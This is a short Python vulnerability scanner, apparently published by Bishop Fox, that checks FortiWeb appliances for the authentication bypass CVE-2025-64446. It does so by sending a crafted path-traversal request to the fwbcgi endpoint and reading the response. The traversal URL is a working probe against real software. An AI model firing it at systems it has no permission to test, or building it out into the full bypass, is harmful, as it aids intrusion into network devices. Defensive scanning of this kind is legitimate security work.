#!/usr/bin/env python3

import sys
import urllib3

import requests


def main():
    # Usage
    if len(sys.argv) < 2 or sys.argv[1] in ["-h", "--help"]:
        print(
            """FortiWeb auth bypass scanner by Bishop Fox
  - Tests a target for authentication bypass CVE-2025-64446
  - Only exploits a path traversal, does not exploit the actual auth bypass
  - Does not perform any administrative actions on the target

Usage: python3 scan.py https://[TARGET]
"""
        )
        sys.exit(0)

    # Test
    target = sys.argv[1]
    print(f"[*] Testing {target}")
    try:
        urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
        url = f"{target}/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi"
        session = requests.Session()
        req = requests.Request(
            method="GET",
            url=url,
            headers={
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
            },
        )
        prepared = req.prepare()
        prepared.url = url
        resp = session.send(
            prepared,
            verify=False,
            timeout=15,
        )

        # Result
        if (
            resp.status_code == 200
            and resp.text.strip() == '{"errcode": "0", "message": "(null)"}'
        ):
            print("[!] Target is VULNERABLE - update immediately!")
        elif (
            resp.status_code == 403
            and "<p>You don't have permission to access this resource.</p>" in resp.text
        ):
            print("[+] Target is not affected")
        else:
            print("[-] Target does not appear to be FortiWeb")

    # Error
    except Exception as err:
        print(f"[-] Request failed: {err}")


if __name__ == "__main__":
    main()
